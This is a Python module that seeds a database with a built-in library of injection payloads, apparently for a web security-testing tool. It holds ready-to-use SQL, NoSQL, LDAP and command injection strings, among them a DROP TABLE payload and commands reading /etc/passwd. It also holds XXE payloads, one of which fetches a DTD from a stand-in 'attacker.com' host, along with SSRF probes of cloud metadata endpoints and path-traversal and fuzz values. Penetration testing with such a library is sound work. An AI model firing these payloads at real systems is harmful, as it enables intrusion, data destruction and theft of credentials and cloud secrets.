"""
Custom payload library with built-in payloads for various injection types
"""

import uuid

from database import PayloadDB


def init_default_payloads():
    """Initialize default payload library"""

    # SQL Injection Payloads
    sql_payloads = [
        (
            "Basic OR 1=1",
            "sql_injection",
            "' OR '1'='1",
            "generic",
            "Classic SQL injection bypass",
        ),
        (
            "Union Select",
            "sql_injection",
            "' UNION SELECT NULL,NULL,NULL--",
            "generic",
            "Union-based injection",
        ),
        (
            "Time-Based Blind",
            "sql_injection",
            "' AND SLEEP(5)--",
            "mysql",
            "MySQL time-based blind",
        ),
        (
            "Error-Based MySQL",
            "sql_injection",
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "mysql",
            "MySQL error-based",
        ),
        (
            "PostgreSQL Time",
            "sql_injection",
            "' AND pg_sleep(5)--",
            "postgresql",
            "PostgreSQL time-based",
        ),
        (
            "MSSQL Time",
            "sql_injection",
            "'; WAITFOR DELAY '00:00:05'--",
            "mssql",
            "MSSQL time-based",
        ),
        (
            "Oracle Time",
            "sql_injection",
            "' AND DBMS_LOCK.SLEEP(5)--",
            "oracle",
            "Oracle time-based",
        ),
        (
            "Boolean Blind",
            "sql_injection",
            "' AND 1=1--",
            "generic",
            "Boolean-based blind",
        ),
        (
            "Stacked Queries",
            "sql_injection",
            "'; DROP TABLE users--",
            "generic",
            "Stacked queries injection",
        ),
    ]

    # NoSQL Injection Payloads
    nosql_payloads = [
        (
            "MongoDB NE",
            "nosql_injection",
            '{"$ne": null}',
            "mongodb",
            "MongoDB not equal bypass",
        ),
        (
            "MongoDB GT",
            "nosql_injection",
            '{"$gt": ""}',
            "mongodb",
            "MongoDB greater than bypass",
        ),
        (
            "MongoDB Regex",
            "nosql_injection",
            '{"$regex": ".*"}',
            "mongodb",
            "MongoDB regex injection",
        ),
        (
            "MongoDB Where",
            "nosql_injection",
            '{"$where": "1==1"}',
            "mongodb",
            "MongoDB $where injection",
        ),
        (
            "CouchDB All",
            "nosql_injection",
            "_all_docs?include_docs=true",
            "couchdb",
            "CouchDB document dump",
        ),
    ]

    # LDAP Injection Payloads
    ldap_payloads = [
        ("LDAP Wildcard", "ldap_injection", "*", "generic", "LDAP wildcard search"),
        (
            "LDAP OR",
            "ldap_injection",
            ")(|(objectClass=*",
            "generic",
            "LDAP OR injection",
        ),
        (
            "LDAP AND",
            "ldap_injection",
            ")(&(objectClass=*",
            "generic",
            "LDAP AND injection",
        ),
        (
            "LDAP Bypass",
            "ldap_injection",
            "admin)(&(password=*))",
            "generic",
            "LDAP authentication bypass",
        ),
    ]

    # Command Injection Payloads
    cmd_payloads = [
        ("Unix ID", "command_injection", "; id", "unix", "Unix ID command"),
        ("Unix Whoami", "command_injection", "| whoami", "unix", "Unix whoami command"),
        (
            "Unix Cat",
            "command_injection",
            "; cat /etc/passwd",
            "unix",
            "Unix read passwd file",
        ),
        (
            "Windows Dir",
            "command_injection",
            "& dir",
            "windows",
            "Windows directory listing",
        ),
        (
            "Windows Whoami",
            "command_injection",
            "| whoami",
            "windows",
            "Windows whoami command",
        ),
        (
            "Backtick Exec",
            "command_injection",
            "`id`",
            "unix",
            "Backtick command execution",
        ),
        (
            "Command Sub",
            "command_injection",
            "$(whoami)",
            "unix",
            "Command substitution",
        ),
    ]

    # XXE Payloads
    xxe_payloads = [
        (
            "XXE File Read",
            "xxe",
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            "generic",
            "XXE local file inclusion",
        ),
        (
            "XXE SSRF",
            "xxe",
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server">]><foo>&xxe;</foo>',
            "generic",
            "XXE SSRF",
        ),
        (
            "XXE Parameter",
            "xxe",
            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>',
            "generic",
            "XXE parameter entity",
        ),
    ]

    # SSRF Payloads
    ssrf_payloads = [
        (
            "AWS Metadata",
            "ssrf",
            "http://169.254.169.254/latest/meta-data/",
            "aws",
            "AWS metadata service",
        ),
        (
            "GCP Metadata",
            "ssrf",
            "http://metadata.google.internal/computeMetadata/v1/",
            "gcp",
            "GCP metadata service",
        ),
        ("Localhost", "ssrf", "http://localhost:80", "generic", "Localhost access"),
        (
            "Internal IP",
            "ssrf",
            "http://192.168.1.1",
            "generic",
            "Internal network access",
        ),
        (
            "File Protocol",
            "ssrf",
            "file:///etc/passwd",
            "generic",
            "Local file access via SSRF",
        ),
    ]

    # Parameter Fuzzing Values
    fuzz_payloads = [
        ("Max Int", "parameter_fuzz", "2147483647", "generic", "Maximum integer value"),
        (
            "Min Int",
            "parameter_fuzz",
            "-2147483648",
            "generic",
            "Minimum integer value",
        ),
        ("Long String", "parameter_fuzz", "A" * 10000, "generic", "Very long string"),
        ("Null Byte", "parameter_fuzz", "%00", "generic", "Null byte injection"),
        ("Unicode", "parameter_fuzz", "\\u0000", "generic", "Unicode null"),
        (
            "Special Chars",
            "parameter_fuzz",
            "!@#$%^&*(){}[]|\\:;\"'<>?,./",
            "generic",
            "Special characters",
        ),
        (
            "Path Traversal",
            "parameter_fuzz",
            "../../../etc/passwd",
            "generic",
            "Path traversal",
        ),
        (
            "Format String",
            "parameter_fuzz",
            "%s%s%s%s",
            "generic",
            "Format string attack",
        ),
    ]

    all_payloads = (
        sql_payloads
        + nosql_payloads
        + ldap_payloads
        + cmd_payloads
        + xxe_payloads
        + ssrf_payloads
        + fuzz_payloads
    )

    for name, ptype, payload, db_type, desc in all_payloads:
        try:
            PayloadDB.create(name, ptype, payload, db_type, desc)
        except:
            pass  # Already exists


def get_payloads_by_type(payload_type: str, database_type: str = None):
    """Get payloads filtered by type and database"""
    return PayloadDB.get_all(payload_type, database_type)
